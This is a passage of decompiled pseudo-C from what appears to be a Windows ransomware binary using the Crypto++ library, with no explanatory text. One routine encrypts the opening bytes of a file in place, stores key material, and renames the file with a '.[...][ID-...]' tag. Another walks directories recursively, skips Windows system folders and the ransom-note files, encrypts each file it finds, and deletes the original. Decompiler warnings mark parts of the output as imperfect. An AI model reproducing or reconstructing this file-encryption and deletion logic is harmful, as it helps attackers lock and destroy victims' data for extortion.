  _BYTE v119[49]; // [esp-5Ch] [ebp-68h] BYREF
  __int64 v120; // [esp-28h] [ebp-34h] BYREF
  int v121; // [esp-20h] [ebp-2Ch]
  int v122; // [esp-18h] [ebp-24h]
  int *v123; // [esp-14h] [ebp-20h]
  int *v124; // [esp-10h] [ebp-1Ch]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-18h]
  void *v126; // [esp-8h] [ebp-14h]
  int v127; // [esp-4h] [ebp-10h]
  int v128; // [esp+0h] [ebp-Ch]
  int v129; // [esp+4h] [ebp-8h]
  int v130; // [esp+8h] [ebp-4h] BYREF
  int retaddr; // [esp+Ch] [ebp+0h]

  v128 = a2;
  v129 = retaddr;
  v127 = -1;
  v126 = &loc_4AD84D;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  v123 = &v130;
  v122 = a1;
  v34 = alloca(801228);
  v124 = &v79;
  v127 = 5;
  memset(v96, 0, sizeof(v96));
  sub_407610(v96, v72, v75);
  LOBYTE(v127) = 6;
  sub_436F80(v96, (int)v118, 32);
  sub_436F80(v96, (int)&v120, 12);
  memset(v94, 0, sizeof(v94));
  sub_409E80(v94);
  LOBYTE(v127) = 7;
  sub_437EB0(v94, (int)v118, 32, (int)&v120, 12);
  v36 = (const wchar_t *)&a3;
  if ( a8 >= 8 )
    v36 = a3;
  v37 = _wfopen(v36, L"r+b");
  _fseeki64(v37, 0i64, 0);
  fread(v116, 1u, 0x61A80u, v37);
  sub_45A450(&v94[2], v117, v116, 0x61A80u);
  _fseeki64(v37, 0i64, 0);
  fwrite(v117, 1u, 0x61A80u, v37);
  fclose(v37);
  memset(v119, 0, sizeof(v119));
  *(_OWORD *)v119 = v118[0];
  *(_OWORD *)&v119[16] = v118[1];
  *(_QWORD *)&v119[32] = v120;
  *(_DWORD *)&v119[40] = v121;
  *(_DWORD *)&v119[44] = *(_DWORD *)a1;
  v119[48] = *(_BYTE *)(a1 + 4);
  sub_419B80((int)v103, "                                                 ");
  LOBYTE(v127) = 8;
  for ( i = 0; ; ++i )
  {
    v90 = i;
    if ( i >= 49 )
      break;
    v39 = v103;
    if ( v104 >= 0x10 )
      v39 = (_DWORD *)v103[0];
    *((_BYTE *)v39 + i) = v119[i];
  }
  memset(v99, 0, sizeof(v99));
  sub_40A110(v99, 1);
  LOBYTE(v127) = 9;
  memset(v100, 0, sizeof(v100));
  v40 = operator new(0x3Cu);
  v92 = v40;
  LOBYTE(v127) = 10;
  memset(v40, 0, 0x3Cu);
  v41 = sub_409010(v40, v76);
  LOBYTE(v127) = 9;
  sub_4072D0(v100, &a9, v42, (int)v41);
  LOBYTE(v127) = 11;
  sub_433390(&v99[1], v100);
  memset(v95, 0, sizeof(v95));
  sub_407610(v95, v73, v77);
  LOBYTE(v127) = 12;
  memset(v97, 0, 0x4Cu);
  sub_417630(v97, (int)&v99[2] + *(_DWORD *)(v99[2] + 4));
  v114 = 0;
  v115 = 15;
  LOBYTE(v113[0]) = 0;
  LOBYTE(v127) = 14;
  memset(v98, 0, sizeof(v98));
  v43 = operator new(0x4Cu);
  v92 = v43;
  LOBYTE(v127) = 15;
  memset(v43, 0, 0x4Cu);
  v44 = operator new(0x10u);
  v91 = v44;
  LOBYTE(v127) = 16;
  *(_OWORD *)v44 = 0i64;
  v45 = sub_4187A0(v44, (int)v113);
  LOBYTE(v127) = 15;
  v46 = sub_407080(v43, (int)v95, (int)v97, (int)v45);
  LOBYTE(v127) = 14;
  sub_4072D0(v98, v103, v47, (int)v46);
  LOBYTE(v127) = 17;
  memset(v93, 0, sizeof(v93));
  v48 = (wchar_t *)&a3;
  if ( a8 >= 8 )
    v48 = a3;
  sub_41B100(v93, v48, v71, v74, v78);
  LOBYTE(v127) = 18;
  if ( !*(FILE **)((char *)&v93[3] + v93[0]->_cnt) )
  {
    sub_41C1D0((int *)v93, (int)"yek", 3i64);
    v49 = v113;
    if ( v115 >= 0x10 )
      v49 = (_DWORD *)v113[0];
    sub_41C1D0((int *)v93, (int)v49, v114);
    sub_41B090(v93);
  }
  v50 = sub_4229A0((int)v88, &a3, L".[");
  LOBYTE(v127) = 19;
  v51 = sub_421DC0((int)v82, v50, (unsigned int *)&a15);
  LOBYTE(v127) = 20;
  v52 = sub_4228F0((int)v84, v51, L"][ID-");
  LOBYTE(v127) = 21;
  v53 = sub_421DC0((int)v86, v52, (unsigned int *)&a21);
  LOBYTE(v127) = 22;
  v54 = sub_4228F0((int)v80, v53, L"]");
  LOBYTE(v127) = 23;
  sub_421DC0((int)v101, v54, (unsigned int *)&a29);
  LOBYTE(v127) = 25;
  if ( v81 >= 8 )
  {
    v112 = 2 * v81 + 2;
    v55 = (void *)v80[0];
    if ( v112 >= 0x1000 )
    {
      v112 = 2 * v81 + 37;
      v55 = *(void **)(v80[0] - 4);
      if ( (unsigned int)(v80[0] - (_DWORD)v55 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v55);
  }
  v80[4] = 0;
  v81 = 7;
  LOWORD(v80[0]) = 0;
  LOBYTE(v127) = 26;
  if ( v87 >= 8 )
  {
    v111 = 2 * v87 + 2;
    v56 = (void *)v86[0];
    if ( v111 >= 0x1000 )
    {
      v111 = 2 * v87 + 37;
      v56 = *(void **)(v86[0] - 4);
      if ( (unsigned int)(v86[0] - (_DWORD)v56 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v56);
  }
  v86[4] = 0;
  v87 = 7;
  LOWORD(v86[0]) = 0;
  LOBYTE(v127) = 27;
  if ( v85 >= 8 )
  {
    v110 = 2 * v85 + 2;
    v57 = (void *)v84[0];
    if ( v110 >= 0x1000 )
    {
      v110 = 2 * v85 + 37;
      v57 = *(void **)(v84[0] - 4);
      if ( (unsigned int)(v84[0] - (_DWORD)v57 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v57);
  }
  v84[4] = 0;
  v85 = 7;
  LOWORD(v84[0]) = 0;
  LOBYTE(v127) = 28;
  if ( v83 >= 8 )
  {
    v109 = 2 * v83 + 2;
    v58 = (void *)v82[0];
    if ( v109 >= 0x1000 )
    {
      v109 = 2 * v83 + 37;
      v58 = *(void **)(v82[0] - 4);
      if ( (unsigned int)(v82[0] - (_DWORD)v58 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v58);
  }
  v82[4] = 0;
  v83 = 7;
  LOWORD(v82[0]) = 0;
  LOBYTE(v127) = 29;
  if ( v89 >= 8 )
  {
    v108 = 2 * v89 + 2;
    v59 = (void *)v88[0];
    if ( v108 >= 0x1000 )
    {
      v108 = 2 * v89 + 37;
      v59 = *(void **)(v88[0] - 4);
      if ( (unsigned int)(v88[0] - (_DWORD)v59 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v59);
  }
  v88[4] = 0;
  v89 = 7;
  LOWORD(v88[0]) = 0;
  v60 = (const wchar_t *)v101;
  if ( v102 >= 8 )
    v60 = (const wchar_t *)v101[0];
  v61 = (const wchar_t *)&a3;
  if ( a8 >= 8 )
    v61 = a3;
  _wrename(v61, v60);
  LOBYTE(v127) = 18;
  if ( v102 >= 8 )
  {
    v107 = 2 * v102 + 2;
    v62 = (void *)v101[0];
    if ( v107 >= 0x1000 )
    {
      v107 = 2 * v102 + 37;
      v62 = *(void **)(v101[0] - 4);
      if ( (unsigned int)(v101[0] - (_DWORD)v62 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v62);
  }
  v101[4] = 0;
  v102 = 7;
  LOWORD(v101[0]) = 0;
  LOBYTE(v127) = 17;
  sub_40A280((char *)v93);
  v98[0] = &CryptoPP::SourceTemplate<CryptoPP::StringStore>::`vftable';
  v98[1] = &CryptoPP::SourceTemplate<CryptoPP::StringStore>::`vftable';
  LOBYTE(v127) = 14;
  if ( v98[3] )
    (**(void (__thiscall ***)(_DWORD, int))v98[3])(v98[3], 1);
  LOBYTE(v127) = 13;
  if ( v115 >= 0x10 )
  {
    v106 = v115 + 1;
    v63 = (void *)v113[0];
    if ( v115 + 1 >= 0x1000 )
    {
      v106 = v115 + 36;
      v63 = *(void **)(v113[0] - 4);
      if ( (unsigned int)(v113[0] - (_DWORD)v63 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v63);
  }
  v114 = 0;
  v115 = 15;
  LOBYTE(v113[0]) = 0;
  LOBYTE(v127) = 12;
  sub_40A6C0(&v97[3]);
  v91 = &v97[18];
  v97[18] = &CryptoPP::NameValuePairs::`vftable';
  v95[0] = &CryptoPP::AutoSeededRandomPool::`vftable';
  LOBYTE(v127) = 11;
  sub_4076F0((int)v95);
  v100[0] = &CryptoPP::SourceTemplate<CryptoPP::StringStore>::`vftable';
  v100[1] = &CryptoPP::SourceTemplate<CryptoPP::StringStore>::`vftable';
  LOBYTE(v127) = 9;
  if ( v100[3] )
    (**(void (__thiscall ***)(_DWORD, int))v100[3])(v100[3], 1);
  LOBYTE(v127) = 8;
  sub_40A1D0(v99);
  LOBYTE(v127) = 7;
  if ( v104 >= 0x10 )
  {
    v105 = v104 + 1;
    v64 = (void *)v103[0];
    if ( v104 + 1 >= 0x1000 )
    {
      v105 = v104 + 36;
      v64 = *(void **)(v103[0] - 4);
      if ( (unsigned int)(v103[0] - (_DWORD)v64 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v64);
  }
  v103[4] = 0;
  v104 = 15;
  LOBYTE(v103[0]) = 0;
  LOBYTE(v127) = 6;
  sub_409F50(v94);
  v96[0] = (int)&CryptoPP::AutoSeededRandomPool::`vftable';
  LOBYTE(v127) = 5;
  sub_4076F0((int)v96);
  v127 = 3;
  if ( a8 >= 8 )
  {
    v65 = a3;
    if ( 2 * a8 + 2 >= 0x1000 )
    {
      v65 = (wchar_t *)*((_DWORD *)a3 - 1);
      if ( (unsigned int)((char *)a3 - (char *)v65 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v65);
  }
  a7 = 0;
  a8 = 7;
  LOWORD(a3) = 0;
  LOBYTE(v127) = 2;
  if ( a14 >= 0x10 )
  {
    v66 = a9;
    if ( a14 + 1 >= 0x1000 )
    {
      v66 = (_BYTE *)*((_DWORD *)a9 - 1);
      if ( (unsigned int)(a9 - v66 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v66);
  }
  a13 = 0;
  a14 = 15;
  LOBYTE(a9) = 0;
  LOBYTE(v127) = 1;
  if ( a20 >= 8 )
  {
    v67 = a15;
    if ( 2 * a20 + 2 >= 0x1000 )
    {
      v67 = (_BYTE *)*((_DWORD *)a15 - 1);
      if ( (unsigned int)(a15 - v67 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v67);
  }
  a19 = 0;
  a20 = 7;
  LOWORD(a15) = 0;
  LOBYTE(v127) = 0;
  if ( a26 >= 8 )
  {
    v68 = a21;
    if ( 2 * a26 + 2 >= 0x1000 )
    {
      v68 = (_BYTE *)*((_DWORD *)a21 - 1);
      if ( (unsigned int)(a21 - v68 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v68);
  }
  a25 = 0;
  a26 = 7;
  LOWORD(a21) = 0;
  v127 = -1;
  if ( a34 >= 8 )
  {
    v69 = a29;
    if ( 2 * a34 + 2 >= 0x1000 )
    {
      v69 = (_BYTE *)*((_DWORD *)a29 - 1);
      if ( (unsigned int)(a29 - v69 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_46C87D(v69);
  }
  a33 = 0;
  a34 = 7;
  result = 0;
  LOWORD(a29) = 0;
  return result;
}
// 40B42C: bad sp value at call
// 40B403: bad sp value at call
// 40AAB0: could not find valid save-restore pair for ebp
// 40AB23: variable 'v72' is possibly undefined
// 40AB23: variable 'v75' is possibly undefined
// 40ACE2: variable 'v76' is possibly undefined
// 40ACF7: variable 'v42' is possibly undefined
// 40AD2E: variable 'v73' is possibly undefined
// 40AD2E: variable 'v77' is possibly undefined
// 40AE29: variable 'v47' is possibly undefined
// 40AE57: variable 'v71' is possibly undefined
// 40AE57: variable 'v74' is possibly undefined
// 40AE57: variable 'v78' is possibly undefined
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 4B91D0: using guessed type void *CryptoPP::NameValuePairs::`vftable';
// 4BA718: using guessed type void *CryptoPP::SourceTemplate<CryptoPP::StringStore>::`vftable';
// 4BA7EC: using guessed type void *CryptoPP::SourceTemplate<CryptoPP::StringStore>::`vftable';
// 4CD0F4: using guessed type wchar_t asc_4CD0F4[2];
// 4CD0F8: using guessed type wchar_t aId[6];
// 4CD104: using guessed type wchar_t asc_4CD104[3];
// 4CFA9C: using guessed type void *CryptoPP::AutoSeededRandomPool::`vftable';

//----- (0040B670) --------------------------------------------------------
int __cdecl sub_40B670(
        _DWORD *a1,
        _BYTE *a2,
        int a3,
        int a4,
        int a5,
        int a6,
        unsigned int a7,
        _BYTE *a8,
        int a9,
        int a10,
        int a11,
        int a12,
        unsigned int a13,
        int a14,
        _BYTE *a15,
        int a16,
        int a17,
        int a18,
        int a19,
        unsigned int a20,
        _BYTE *a21,
        int a22,
        int a23,
        int a24,
        int a25,
        unsigned int a26)
{
  int v26; // edi
  const WCHAR *v27; // eax
  HANDLE v28; // ebx
  int v29; // esi
  char *v30; // eax
  int v31; // eax
  LPCWSTR *v32; // ecx
  void *v33; // edx
  LPCWSTR *v34; // ecx
  void *v35; // edx
  LPCWSTR *v36; // ecx
  void *v37; // edx
  const wchar_t *v38; // eax
  FILE *v39; // eax
  WCHAR *v40; // eax
  bool v41; // bl
  int v42; // ecx
  LPCWSTR *v43; // ecx
  void *v44; // edx
  WCHAR *v45; // eax
  LPCWSTR *v46; // ecx
  void *v47; // edx
  _DWORD *v48; // eax
  LPCWSTR *v49; // ecx
  void *v50; // edx
  int v51; // ecx
  int v52; // ecx
  int v53; // ecx
  char *v54; // eax
  int v55; // ecx
  int v56; // ecx
  char v57; // bl
  LPCWSTR *v58; // ecx
  void *v59; // edx
  const wchar_t *v60; // eax
  LPCWSTR *v61; // ecx
  void *v62; // edx
  int v63; // ecx
  int v64; // edi
  int v65; // esi
  unsigned __int64 v66; // kr00_8
  LPCWSTR *v67; // ecx
  WCHAR *v68; // edx
  void *v69; // esi
  unsigned int v70; // ecx
  int v71; // edx
  _BYTE *v72; // ecx
  unsigned int v73; // edx
  _BYTE *v74; // ecx
  unsigned int v75; // edx
  _BYTE *v76; // ecx
  unsigned int v77; // edx
  _BYTE *v78; // ecx
  int result; // eax
  wchar_t *v80[5]; // [esp-78h] [ebp-430h] BYREF
  unsigned int v81; // [esp-64h] [ebp-41Ch] BYREF
  _BYTE *v82; // [esp-60h] [ebp-418h] BYREF
  int v83; // [esp-5Ch] [ebp-414h]
  int v84; // [esp-58h] [ebp-410h]
  int v85; // [esp-54h] [ebp-40Ch]
  int v86; // [esp-50h] [ebp-408h]
  unsigned int v87; // [esp-4Ch] [ebp-404h] BYREF
  _BYTE *v88; // [esp-48h] [ebp-400h] BYREF
  int v89; // [esp-44h] [ebp-3FCh]
  int v90; // [esp-40h] [ebp-3F8h]
  int v91; // [esp-3Ch] [ebp-3F4h]
  int v92; // [esp-38h] [ebp-3F0h]
  unsigned int v93; // [esp-34h] [ebp-3ECh]
  _BYTE *v94; // [esp-30h] [ebp-3E8h] BYREF
  int v95; // [esp-2Ch] [ebp-3E4h]
  int v96; // [esp-28h] [ebp-3E0h]
  int v97; // [esp-24h] [ebp-3DCh]
  int v98; // [esp-20h] [ebp-3D8h]
  unsigned int v99; // [esp-1Ch] [ebp-3D4h]
  _BYTE *v100; // [esp-18h] [ebp-3D0h] BYREF
  int v101; // [esp-14h] [ebp-3CCh]
  int v102; // [esp-10h] [ebp-3C8h]
  int v103; // [esp-Ch] [ebp-3C4h]
  int v104; // [esp-8h] [ebp-3C0h]
  LPCWSTR *v105; // [esp-4h] [ebp-3BCh]
  unsigned int v106; // [esp+0h] [ebp-3B8h] BYREF
  int v107[5]; // [esp+10h] [ebp-3A8h] BYREF
  unsigned int v108; // [esp+24h] [ebp-394h]
  int v109[5]; // [esp+28h] [ebp-390h] BYREF
  unsigned int v110; // [esp+3Ch] [ebp-37Ch]
  int v111[5]; // [esp+40h] [ebp-378h] BYREF
  unsigned int v112; // [esp+54h] [ebp-364h]
  int v113[5]; // [esp+58h] [ebp-360h] BYREF
  unsigned int v114; // [esp+6Ch] [ebp-34Ch]
  int v115[5]; // [esp+70h] [ebp-348h] BYREF
  unsigned int v116; // [esp+84h] [ebp-334h]
  int v117[5]; // [esp+88h] [ebp-330h] BYREF
  unsigned int v118; // [esp+9Ch] [ebp-31Ch]
  _BYTE **v119; // [esp+A0h] [ebp-318h]
  int v120[4]; // [esp+ACh] [ebp-30Ch] BYREF
  int v121; // [esp+BCh] [ebp-2FCh]
  unsigned int v122; // [esp+C0h] [ebp-2F8h]
  unsigned int *v123; // [esp+C4h] [ebp-2F4h]
  unsigned int *v124; // [esp+C8h] [ebp-2F0h]
  __int64 v125; // [esp+CCh] [ebp-2ECh]
  wchar_t **v126; // [esp+D4h] [ebp-2E4h]
  _BYTE **v127; // [esp+D8h] [ebp-2E0h]
  _DWORD *v128; // [esp+DCh] [ebp-2DCh]
  unsigned int v129; // [esp+E0h] [ebp-2D8h]
  int v130; // [esp+E4h] [ebp-2D4h]
  HANDLE hFindFile; // [esp+E8h] [ebp-2D0h]
  struct _WIN32_FIND_DATAW FindFileData; // [esp+ECh] [ebp-2CCh] BYREF
  int v133[5]; // [esp+33Ch] [ebp-7Ch] BYREF
  unsigned int v134; // [esp+350h] [ebp-68h]
  unsigned int v135; // [esp+354h] [ebp-64h]
  LPCWSTR *v136; // [esp+358h] [ebp-60h]
  LPCWSTR *v137; // [esp+35Ch] [ebp-5Ch]
  LPCWSTR *v138; // [esp+360h] [ebp-58h]
  LPCWSTR *v139; // [esp+364h] [ebp-54h]
  LPCWSTR *v140; // [esp+368h] [ebp-50h]
  LPCWSTR *v141; // [esp+36Ch] [ebp-4Ch]
  LPCWSTR *v142; // [esp+370h] [ebp-48h]
  LPCWSTR *v143; // [esp+374h] [ebp-44h]
  LPCWSTR *v144; // [esp+378h] [ebp-40h]
  int v145; // [esp+37Ch] [ebp-3Ch]
  LPCWSTR lpFileName[5]; // [esp+380h] [ebp-38h] BYREF
  unsigned int v147; // [esp+394h] [ebp-24h]
  unsigned __int64 v148; // [esp+398h] [ebp-20h] BYREF
  int v149; // [esp+3A0h] [ebp-18h]
  int *v150; // [esp+3A8h] [ebp-10h]
  int v151; // [esp+3B4h] [ebp-4h]
  int savedregs; // [esp+3B8h] [ebp+0h] BYREF

  v150 = (int *)&v106;
  v128 = a1;
  v129 = a14;
  v26 = 0;
  v130 = 0;
  v151 = 5;
  v148 = 0i64;
  v149 = 0;
  sub_4229A0((int)lpFileName, a1, L"\\*");
  LOBYTE(v151) = 6;
  v27 = (const WCHAR *)lpFileName;
  if ( v147 >= 8 )
    v27 = lpFileName[0];
  hFindFile = FindFirstFileW(v27, &FindFileData);
  if ( hFindFile == (HANDLE)-1 )
    sub_422D50(byte_4F0290, "fuck");
  v28 = hFindFile;
  do
  {
    v29 = sub_4194E0((int)v113, FindFileData.cFileName);
    LOBYTE(v151) = 7;
    v30 = (char *)sub_4229A0((int)v115, v128, (unsigned __int16 *)"\\");
    LOBYTE(v151) = 8;
    v31 = sub_421BF0((int)v117, v30, v29);
    LOBYTE(v151) = 9;
    sub_419470((int)lpFileName, v31);
    LOBYTE(v151) = 8;
    if ( v118 >= 8 )
    {
      v32 = (LPCWSTR *)(2 * v118 + 2);
      v144 = v32;
      v33 = (void *)v117[0];
      if ( (unsigned int)v32 >= 0x1000 )
      {
        v32 = (LPCWSTR *)(2 * v118 + 37);
        v144 = v32;
        v33 = *(void **)(v117[0] - 4);
        if ( (unsigned int)(v117[0] - (_DWORD)v33 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      v105 = v32;
      sub_46C87D(v33);
    }
    v117[4] = 0;
    v118 = 7;
    LOWORD(v117[0]) = 0;
    LOBYTE(v151) = 7;
    if ( v116 >= 8 )
    {
      v34 = (LPCWSTR *)(2 * v116 + 2);
      v143 = v34;
      v35 = (void *)v115[0];
      if ( (unsigned int)v34 >= 0x1000 )
      {
        v34 = (LPCWSTR *)(2 * v116 + 37);
        v143 = v34;
        v35 = *(void **)(v115[0] - 4);
        if ( (unsigned int)(v115[0] - (_DWORD)v35 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      v105 = v34;
      sub_46C87D(v35);
    }
    v115[4] = 0;
    v116 = 7;
    LOWORD(v115[0]) = 0;
    LOBYTE(v151) = 6;
    if ( v114 >= 8 )
    {
      v36 = (LPCWSTR *)(2 * v114 + 2);
      v142 = v36;
      v37 = (void *)v113[0];
      if ( (unsigned int)v36 >= 0x1000 )
      {
        v36 = (LPCWSTR *)(2 * v114 + 37);
        v142 = v36;
        v37 = *(void **)(v113[0] - 4);
        if ( (unsigned int)(v113[0] - (_DWORD)v37 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      v105 = v36;
      sub_46C87D(v37);
    }
    v113[4] = 0;
    v114 = 7;
    LOWORD(v113[0]) = 0;
    if ( (FindFileData.dwFileAttributes & 0x10) != 0 )
    {
      if ( lstrcmpW(FindFileData.cFileName, ".")
        && lstrcmpW(FindFileData.cFileName, L"..")
        && sub_4191C0((char *)lpFileName, L"C:\\Windows", v63) == -1 )
      {
        v105 = lpFileName;
        if ( v149 == HIDWORD(v148) )
        {
          sub_423CD0((int *)&v148, SHIDWORD(v148), v105);
        }
        else
        {
          sub_419530((_DWORD *)HIDWORD(v148), v105);
          HIDWORD(v148) += 24;
        }
      }
    }
    else
    {
      LOBYTE(v151) = 10;
      v38 = (const wchar_t *)lpFileName;
      if ( v147 >= 8 )
        v38 = lpFileName[0];
      v39 = _wfopen(v38, L"r+b");
      if ( !v39 )
      {
        LOBYTE(v151) = 6;
        continue;
      }
      fclose(v39);
      v40 = (WCHAR *)sub_421E60((int)v111, (unsigned int *)lpFileName, (int)v105);
      LOBYTE(v151) = 11;
      v41 = sub_404BC0(v40);
      LOBYTE(v151) = 10;
      v42 = v112;
      if ( v112 >= 8 )
      {
        v43 = (LPCWSTR *)(2 * v112 + 2);
        v141 = v43;
        v44 = (void *)v111[0];
        if ( (unsigned int)v43 >= 0x1000 )
        {
          v43 = (LPCWSTR *)(2 * v112 + 37);
          v141 = v43;
          v44 = *(void **)(v111[0] - 4);
          if ( (unsigned int)(v111[0] - (_DWORD)v44 - 4) > 0x1F )
            _invalid_parameter_noinfo_noreturn();
        }
        v105 = v43;
        sub_46C87D(v44);
      }
      v111[4] = 0;
      v112 = 7;
      LOWORD(v111[0]) = 0;
      if ( v41 )
      {
        v45 = (WCHAR *)sub_421E60((int)v109, (unsigned int *)lpFileName, v42);
        LOBYTE(v151) = 13;
        v125 = sub_404B60(v45);
        LOBYTE(v151) = 10;
        v42 = v110;
        if ( v110 >= 8 )
        {
          v46 = (LPCWSTR *)(2 * v110 + 2);
          v140 = v46;
          v47 = (void *)v109[0];
          if ( (unsigned int)v46 >= 0x1000 )
          {
            v46 = (LPCWSTR *)(2 * v110 + 37);
            v140 = v46;
            v47 = *(void **)(v109[0] - 4);
            if ( (unsigned int)(v109[0] - (_DWORD)v47 - 4) > 0x1F )
              _invalid_parameter_noinfo_noreturn();
          }
          v105 = v46;
          sub_46C87D(v47);
        }
        v109[4] = 0;
        v110 = 7;
        LOWORD(v109[0]) = 0;
      }
      v48 = (_DWORD *)sub_421E60((int)v107, (unsigned int *)lpFileName, v42);
      LOBYTE(v151) = 15;
      sub_404120(v48, (int)v133);
      LOBYTE(v151) = 17;
      if ( v108 >= 8 )
      {
        v49 = (LPCWSTR *)(2 * v108 + 2);
        v139 = v49;
        v50 = (void *)v107[0];
        if ( (unsigned int)v49 >= 0x1000 )
        {
          v49 = (LPCWSTR *)(2 * v108 + 37);
          v139 = v49;
          v50 = *(void **)(v107[0] - 4);
          if ( (unsigned int)(v107[0] - (_DWORD)v50 - 4) > 0x1F )
            _invalid_parameter_noinfo_noreturn();
        }
        v105 = v49;
        sub_46C87D(v50);
      }
      v107[4] = 0;
      v108 = 7;
      LOWORD(v107[0]) = 0;
      if ( (unsigned __int64)(v125 - 1) > 0x249EF
        || sub_4191C0((char *)lpFileName, L"pubkey.txt", v125 - 1) != -1
        || sub_4191C0((char *)lpFileName, L"IDo.txt", v51) != -1
        || sub_4191C0((char *)lpFileName, L"Decryption-Info", v52) != -1 )
      {
        goto LABEL_47;
      }
      sub_421E60((int)v120, (unsigned int *)&a21, v53);
      LOBYTE(v151) = 19;
      v26 |= 1u;
      v130 = v26;
      v54 = (char *)v120;
      if ( v122 >= 8 )
        v54 = (char *)v120[0];
      if ( sub_403F60(v133, v54, v121)
        && sub_4191C0((char *)lpFileName, L"C:\\Windows", v55) == -1
        && sub_4191C0((char *)lpFileName, L"C:\\\\Windows\\", v56) == -1 )
      {
        v57 = 1;
      }
      else
      {
LABEL_47:
        v57 = 0;
      }
      v151 = 17;
      if ( (v130 & 1) != 0 )
      {
        v130 &= ~1u;
        LOBYTE(v151) = 17;
        if ( v122 >= 8 )
        {
          v58 = (LPCWSTR *)(2 * v122 + 2);
          v138 = v58;
          v59 = (void *)v120[0];
          if ( (unsigned int)v58 >= 0x1000 )
          {
            v58 = (LPCWSTR *)(2 * v122 + 37);
            v138 = v58;
            v59 = *(void **)(v120[0] - 4);
            if ( (unsigned int)(v120[0] - (_DWORD)v59 - 4) > 0x1F )
              _invalid_parameter_noinfo_noreturn();
          }
          v105 = v58;
          sub_46C87D(v59);
        }
        v121 = 0;
        v122 = 7;
        LOWORD(v120[0]) = 0;
      }
      if ( v57 )
      {
        v119 = &v100;
        sub_419530(&v100, &a21);
        LOBYTE(v151) = 21;
        v124 = (unsigned int *)&v94;
        sub_419530(&v94, &a8);
        LOBYTE(v151) = 22;
        v123 = (unsigned int *)&v88;
        sub_419530(&v88, &a15);
        LOBYTE(v151) = 23;
        v127 = &v82;
        sub_419BE0(&v82, &a2);
        LOBYTE(v151) = 24;
        v126 = v80;
        sub_419530(v80, lpFileName);
        LOBYTE(v151) = 17;
        sub_409110(
          v129,
          (int)&savedregs,
          v26,
          v29,
          v80[0],
          (int)v80[1],
          (int)v80[2],
          (int)v80[3],
          (int)v80[4],
          v81,
          v82,
          v83,
          v84,
          v85,
          v86,
          v87,
          v88,
          v89,
          v90,
          v91,
          v92,
          v93,
          v94,
          v95,
          v96,
          v97,
          v98,
          v99,
          v100,
          v101,
          v102,
          v103,
          v104,
          (unsigned int)v105);
        v60 = (const wchar_t *)lpFileName;
        if ( v147 >= 8 )
          v60 = lpFileName[0];
        _wremove(v60);
      }
      LOBYTE(v151) = 10;
      if ( v134 >= 8 )
      {
        v61 = (LPCWSTR *)(2 * v134 + 2);
        v137 = v61;
        v62 = (void *)v133[0];
        if ( (unsigned int)v61 >= 0x1000 )
        {
          v61 = (LPCWSTR *)(2 * v134 + 37);
          v137 = v61;
          v62 = *(void **)(v133[0] - 4);
          if ( (unsigned int)(v133[0] - (_DWORD)v62 - 4) > 0x1F )
            _invalid_parameter_noinfo_noreturn();
        }
        v105 = v61;
        sub_46C87D(v62);
      }
      v133[4] = 0;
      v134 = 7;
      LOWORD(v133[0]) = 0;
      v151 = 6;
      v26 = v130;
    }
    v28 = hFindFile;
  }
  while ( FindNextFileW(v28, &FindFileData) );
  FindClose(v28);
  v66 = v148;
  v64 = HIDWORD(v66);
  v65 = v66;
  v145 = v148;
  while ( v65 != v64 )
  {
    v126 = (wchar_t **)&v100;
    sub_419530(&v100, &a21);
    LOBYTE(v151) = 28;
    v127 = &v94;
    sub_419530(&v94, &a15);
    LOBYTE(v151) = 29;
    v93 = v129;
    v123 = &v87;
    sub_419530(&v87, &a8);
    LOBYTE(v151) = 30;
    v124 = &v81;
    sub_419BE0(&v81, &a2);
    LOBYTE(v151) = 6;
    sub_40B670(
      v65,
      v81,
      v82,
      v83,
      v84,
      v85,
      v86,
      v87,
      v88,
      v89,
      v90,
      v91,
      v92,
      v93,
      v94,
      v95,
      v96,
      v97,
      v98,
      v99,
      v100,
      v101,
      v102,
      v103,
      v104,
      v105);
    v65 += 24;
    v145 = v65;
  }
  LOBYTE(v151) = 5;
  if ( v147 >= 8 )
  {
    v67 = (LPCWSTR *)(2 * v147 + 2);
    v136 = v67;
    v68 = (WCHAR *)lpFileName[0];
    if ( (unsigned int)v67 >= 0x1000 )
    {
      v67 = (LPCWSTR *)(2 * v147 + 37);
      v136 = v67;
      v68 = (WCHAR *)*((_DWORD *)lpFileName[0] - 1);
      if ( (unsigned int)((char *)lpFileName[0] - (char *)v68 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v105 = v67;
    sub_46C87D(v68);
  }
  lpFileName[4] = 0;
  v147 = 7;
  LOWORD(lpFileName[0]) = 0;
  LOBYTE(v151) = 4;
  if ( (_DWORD)v148 )
  {
    v105 = (LPCWSTR *)v148;
    sub_425130(v148, SHIDWORD(v148));
    v69 = (void *)v148;
    v70 = 24 * ((v149 - (int)v148) / 24);
    v135 = v70;
    if ( v70 >= 0x1000 )
    {
      v70 += 35;
      v135 = v70;
      v69 = *(void **)(v148 - 4);
      if ( (unsigned int)(v148 - (_DWORD)v69 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    v105 = (LPCWSTR *)v70;
